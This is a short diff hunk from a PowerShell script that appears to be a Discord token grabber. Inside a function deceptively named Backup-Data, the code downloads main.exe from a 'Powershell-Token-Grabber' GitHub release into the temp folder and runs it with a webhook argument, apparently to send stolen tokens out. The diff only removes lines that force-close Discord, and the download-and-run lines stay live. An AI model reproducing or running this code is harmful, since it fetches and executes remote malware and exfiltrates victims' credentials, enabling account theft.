@@ -819,9 +819,6 @@ function Backup-Data {
 
     (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
-    Stop-Process -Name "discord" -Force  | Out-Null
-    Stop-Process -Name "discordcanary" -Force  | Out-Null
-    Stop-Process -Name "discordptb" -Force  | Out-Null
 
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
